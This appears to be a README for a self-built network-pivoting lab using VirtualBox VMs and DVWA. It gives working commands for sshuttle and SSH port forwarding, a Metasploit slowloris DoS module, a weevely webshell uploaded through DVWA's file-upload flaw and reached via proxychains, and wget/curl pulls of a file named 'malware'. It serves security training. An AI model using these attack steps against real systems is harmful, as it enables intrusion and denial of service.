# NM-Lab-Network-pivoting

This is a Lab for practicing network pivoting.

## Prerequisite

### Network architecture

The following is our network settings for doing this Lab.

#### Local (Attacker)
* OS : MacOS or Kali Linux  
* IP : 192.168.2.105 (For example) (Connect with Internet)

#### VirtualBox VM1 (SSH Server)  
* OS : Ubuntu server 20.04  
* (Adapter1 橋接網路卡Bridge enp0s3) IP : 192.168.2.113 (For example)  
* (Adapter2 內網Internal enp0s8) IP : 192.168.1.1 (For example)  

#### VirtualBox VM2 (Target Machine)
* OS : Ubuntu server 20.04.2 or Kali Linux  
* (Adapter2 內網 enp0s8) IP : 192.168.1.100 (For example)

#### VirtualBox VM3 (Optional)
* OS : Metasploitable2 (For running DVWA)  
(You can also install DVWA on the target machine, but it is quite a long process for installing DVWA alone.)  
(I personally take this as my guideline to install DVWA https://medium.datadriveninvestor.com/setup-install-dvwa-into-your-linux-distribution-d76dc3b80357)
* (內網 eth0) IP : 192.168.1.101 (For example)  

Step 0 :  
下載然後導入ubuntu server到VirtualBox  
https://ubuntu.com/download/server  

Step 1 :  
完成VirtualBox的網路介面卡設定  
確認連接內網的網路卡擁有相同的名稱  

Step 2 :  
登陸兩(三)台要連接內網的VM之後，使用  
`$ ifconfig -a`  
確認內網網路卡的名稱 (In our case, enp0s8)  
然後使用指令  
`$ sudo ifconfig enp0s8 192.168.1.1 netmask 255.255.255.0 up`  
開啟網路卡  
192.168.1.1 可以自己設定 (不同的機器要不同 192.168.1.1 192.168.1.100 in our case)  
不過注意每一次開機都要設定  

這樣即完成網路設定  
可以用ping或ifconfig指令確認  

### Enviroment & Installation

#### Local (Attacker)
Ssuttle (For pivoting)  
https://github.com/sshuttle/sshuttle  
Nmap (For scanning)(option)  
https://nmap.org/book/inst-macosx.html  
Metasploit (For using slowloris DOS attack exploit module)  
https://www.metasploit.com    

#### VirtualBox VM1 (SSH Server)  

SSH service need to be installed  
HTTP service (Apache web service) need to be installed  
root account for sshuttle  
normal user account for port forwarding  

#### VirtualBox VM2 (Target machine)

ssh service need to be installed  
http service (Apache web service) need to be installed  

## Ways of Pivoting
To confirm the results of pivoting, a http server has been hosted on target machine at port 8000 using `python -m SimpleHTTPServer`. We can use `http://192.168.1.100:8000` to connect it from internal network  

### sshuttle  

Open terminal  
`$ sshuttle -r user@192.168.2.113 192.168.1.0/24`  
Need root privilege for both local and the ssh server  

### Dynamic port forwarding
On pivot (SSH server):  
`$ ssh user@192.168.2.113 -D 127.0.0.1:21000 -N`  
You can use any available port on localhost  

### Reverse remote port forwarding
#### Attacker
Step 1 :   
Create a new dedicated user  
```
$ sudo useradd sshpivot --no-create-home --shell /bin/false  
$ sudo passwd sshpivot  
```
Step 2 :  
Add `/bin/false` to `/etc/shells`  

Step 3 :  
`sudo systemctl restart ssh`  

Step 4 :  
Request http://127.0.0.1:14000 to reach http://192.168.1.100:8000 after pivot connected  

#### Pivot (SSH server)
`$ ssh sshpivot@192.168.2.105 -R 127.0.0.1:14000:192.168.1.100:8000 -N`  

## Ways of Attack

### DOS

Open terminal  
Run metasploitable  
Somewhere in the /opt/metasploit-framework/bin/ if you are using MacOS (High Sierra) like me  
`$ ./msfconsole`  
(Some configurations if first time use)  
```
msf6 > search slowloris  
msf6 > use auxiliary/dos/http/slowloris  
msf6 auxiliary(dos/http/slowloris) > options  
msf6 auxiliary(dos/http/slowloris) > set sockets 200
```
(the number of `sockets` doesn't really matter)
```
msf6 auxiliary(dos/http/slowloris) > set rhost 192.168.1.100  
msf6 auxiliary(dos/http/slowloris) > run  
```

Now you should see it working !!!  

可以在target machine上下指令確認有沒有被DOS  
`$ systemctl status`  

### Reverse shell
Use DVWA's file upload vulnerability to open a reverse shell (webshell). [Reference](https://medium.com/blacksecurity/557d6392eefe)  

Step 1 :  
`weevely generate %password% %~/shell.php%`  

Step 2 :  
Upload `shell.php`  

Step 3 :  
`proxychains weevely http://192.168.1.101/dvwa/hackable/uploads/shell.php %password%`  

Note that we must use `proxychains` to connect with proxy. Add `socks4 127.0.0.1 21000` to `/etc/proxychains4.conf`.  

### Downloading other malwares


* From internal network  
  There is a file called malware on VM2 (target machine), we want to download it from other machine in local area network. We can use commands like  
  `$ wget http://192.168.1.100:8000/malware`  
  or  
  `$ curl -O http://192.168.1.100:8000/malware`  

* From external network  
  If target machine can access external network, we can use similar command as above. If target only has access to internal network, "reverse pivoting" to connect to attacker. However, reverse pivoting might not success if we use the webshell we described previously.  
